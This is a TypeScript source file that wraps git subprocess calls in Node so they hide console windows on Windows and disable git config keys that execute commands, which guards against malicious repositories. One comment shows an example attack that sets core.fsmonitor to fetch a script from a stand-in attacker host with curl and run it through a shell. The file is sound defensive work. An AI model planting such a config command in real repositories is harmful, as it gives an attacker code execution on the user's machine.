/**
 * One home for spawning `git` (or any git-adjacent subprocess) from Node.
 *
 * Every call routed through here sets `windowsHide: true`. Without it, a console
 * subprocess spawned from a parent that has no attached console of its own — the
 * `openlore serve`/`mcp` daemon, a Claude Code hook invocation (`orient --inject`),
 * the Pi extension host — gets a BRAND NEW visible console window on Windows, one
 * per spawn. A hot path that shells out to `git` once per file (provenance,
 * change-coupling, decision/spec projection review status) turns that into a
 * storm of flashing windows (change: fix-windows-git-spawn-console-flash).
 * `windowsHide` is a documented no-op on macOS/Linux, so this is safe everywhere.
 *
 * Usage: `execFileGit('git', args, opts)` in place of a locally
 * `promisify(execFile)`'d call; `execFileGitSync('git', args, opts)` in place of
 * a direct `execFileSync('git', ...)` call; `spawnGit` / `spawnGitSync` in place
 * of a direct `spawn`/`spawnSync` of `git` — the streaming shapes (`git cat-file
 * --batch`, a fd-redirected `spawnSync`) that the execFile helpers cannot express.
 *
 * Typed like the `node:child_process` functions they wrap. The ONE deliberate
 * difference is `execFileGitSync`'s default encoding: `execFileSync` returns a
 * `Buffer` unless an encoding is given, which makes the ergonomic
 * `execFileGitSync('git', args, { cwd }).trim()` a runtime `TypeError`. This
 * module defaults that call to `'utf-8'` so a plain-options call really does
 * return the `string` its signature promises; pass `{ encoding: 'buffer' }` for
 * bytes.
 *
 * Every call also gets the {@link GIT_UNTRUSTED_CONFIG_OFF} argv prefix, which
 * neutralizes the config keys git treats as COMMANDS TO RUN. See that constant
 * for the threat and the residual.
 *
 * Structural guards fail CI on a regression: `git-exec.test.ts` on a new `git`
 * spawn that skips this file, and `windows-hidden-spawn-guard.test.ts` on ANY
 * subprocess spawned without `windowsHide` and without an inherited console.
 */

import {
  execFile,
  execFileSync,
  spawn,
  spawnSync,
  type ExecFileOptions,
  type ExecFileSyncOptions,
} from 'node:child_process';
import { basename } from 'node:path';
import { promisify } from 'node:util';

const rawExecFileAsync = promisify(execFile);

/**
 * The argv prefix that stops an ANALYZED REPOSITORY from executing code through git.
 *
 * Several git config keys are not settings but command strings git runs, and git reads
 * them from the worktree's OWN `.git/config`. Running `git status` inside a directory
 * someone else authored is therefore arbitrary code execution as the current user:
 *
 *     git config core.fsmonitor 'sh -c "curl evil.example | sh; echo /dev/null"'
 *
 * fires on a plain `git status --porcelain` — which is exactly what `openlore analyze`
 * runs, twice, on every invocation (`source-state.ts`). `enforce`, `drift`,
 * `blast_radius` and `map_in_flight_conflicts` reach the same spawns. This is not a
 * hypothetical worktree: a repo handed over as a zip/tarball, a vendored or submodule
 * worktree, or a "here is my bug, please look" clone all ship a `.git` the author wrote.
 *
 * `safe.directory` does NOT cover this. It only refuses a differently-OWNED directory,
 * so anything the developer unpacked themselves is owned by them and fully trusted.
 *
 * A command-line `-c` beats the repository's config file, so this prefix disables each
 * key regardless of what the repo asked for. It is applied to every git spawn rather
 * than to the ones that look dangerous, because which key fires depends on the repo's
 * config and attributes, not on the subcommand we chose.
 *
 * RESIDUAL, stated honestly: `.gitattributes`-driven drivers — `diff.<name>.textconv`
 * and `filter.<name>.clean/smudge` — are also command strings, and they cannot be turned
 * off centrally because the driver NAME is chosen by the repository and `-c` has no
 * wildcard. Commands that honor them should pass `--no-textconv` themselves. Everything
 * git will run without an attribute opt-in is covered here.
 */
export const GIT_UNTRUSTED_CONFIG_OFF: readonly string[] = [
  // Runs on `git status` / `git diff` to speed up dirty-file detection. The verified vector.
  '-c', 'core.fsmonitor=false',
  // Runs instead of git's internal diff, on any `git diff`.
  '-c', 'diff.external=',
  // Runs to page output. We never want a pager in a subprocess regardless.
  '-c', 'core.pager=cat',
  // Runs for any transport that shells out to ssh.
  '-c', 'core.sshCommand=',
  // `ext::<command>` URLs execute their argument. No remote we use needs it.
  '-c', 'protocol.ext.allow=never',
  // Hook directory; nothing here commits, but a future caller must not inherit one.
  '-c', 'core.hooksPath=',
  // Server-side hooks, reachable if a caller ever serves a repo.
  '-c', 'uploadpack.packObjectsHook=',
];

/** True when `file` names the git binary (bare, absolute, or `.exe`). */
function isGitBinary(file: string): boolean {
  const base = basename(String(file)).toLowerCase();
  return base === 'git' || base === 'git.exe';
}

/**
 * Prepend {@link GIT_UNTRUSTED_CONFIG_OFF} to a git argv.
 *
 * A non-git binary routed through these helpers (for the `windowsHide` discipline alone)
 * is passed through untouched — git's `-c` flags would be meaningless or hostile there.
 */
function hardenedArgs(file: string, args?: readonly string[]): string[] | undefined {
  if (!isGitBinary(file)) return args as string[] | undefined;
  return [...GIT_UNTRUSTED_CONFIG_OFF, ...(args ?? [])];
}

/** Promisified `execFile`, `windowsHide: true` always applied. */
export function execFileGit(
  file: string,
  args: readonly string[] | undefined,
  options: ExecFileOptions & { encoding: 'buffer' },
): Promise<{ stdout: Buffer; stderr: Buffer }>;
export function execFileGit(
  file: string,
  args?: readonly string[],
  options?: ExecFileOptions,
): Promise<{ stdout: string; stderr: string }>;
export function execFileGit(
  file: string,
  args?: readonly string[],
  options?: ExecFileOptions,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any -- implementation signature for the overloads above
): Promise<any> {
  return rawExecFileAsync(file, hardenedArgs(file, args) as string[], { ...options, windowsHide: true });
}

/**
 * `execFileSync`, `windowsHide: true` always applied.
 *
 * Also defaults `encoding` to `'utf-8'`. Node's own `execFileSync` returns a `Buffer` when no
 * encoding is given, so the `string` overload below would otherwise be a lie that only fails at
 * runtime (`.trim()` on a Buffer). Callers that want bytes ask for them: `{ encoding: 'buffer' }`.
 */
export function execFileGitSync(
  file: string,
  args: readonly string[] | undefined,
  options: ExecFileSyncOptions & { encoding: 'buffer' },
): Buffer;
export function execFileGitSync(
  file: string,
  args?: readonly string[],
  options?: ExecFileSyncOptions,
): string;
export function execFileGitSync(
  file: string,
  args?: readonly string[],
  options?: ExecFileSyncOptions,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any -- implementation signature for the overloads above
): any {
  return execFileSync(file, hardenedArgs(file, args), { encoding: 'utf-8', ...options, windowsHide: true });
}

/**
 * `spawn`, `windowsHide: true` always applied — for the streaming shapes `execFile` cannot
 * express (a long-lived `git cat-file --batch` fed over stdin).
 *
 * Typed as `typeof spawn` rather than re-declared, so every one of Node's overloads survives the
 * wrapper — including the stdio-tuple narrowing that makes `child.stdin`/`stdout` non-nullable for
 * a `{ stdio: ['pipe', 'pipe', 'pipe'] }` call. Re-declaring a single signature here would widen
 * those back to `| null` at every call site.
 */
export const spawnGit: typeof spawn = (
  // eslint-disable-next-line @typescript-eslint/no-explicit-any -- transparent pass-through to the overloads above
  file: any, args?: any, options?: any,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any -- ditto
): any => spawn(file, hardenedArgs(file, args), { ...(options ?? {}), windowsHide: true });

/**
 * `spawnSync`, `windowsHide: true` always applied — for the synchronous shapes `execFileSync`
 * cannot express (redirecting the child's stdout/stderr straight onto file descriptors).
 *
 * Typed as `typeof spawnSync` for the same reason as {@link spawnGit}: it preserves the
 * encoding-dependent `SpawnSyncReturns<string>` / `SpawnSyncReturns<Buffer>` split.
 */
export const spawnGitSync: typeof spawnSync = (
  // eslint-disable-next-line @typescript-eslint/no-explicit-any -- transparent pass-through to the overloads above
  file: any, args?: any, options?: any,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any -- ditto
): any => spawnSync(file, hardenedArgs(file, args), { ...(options ?? {}), windowsHide: true });
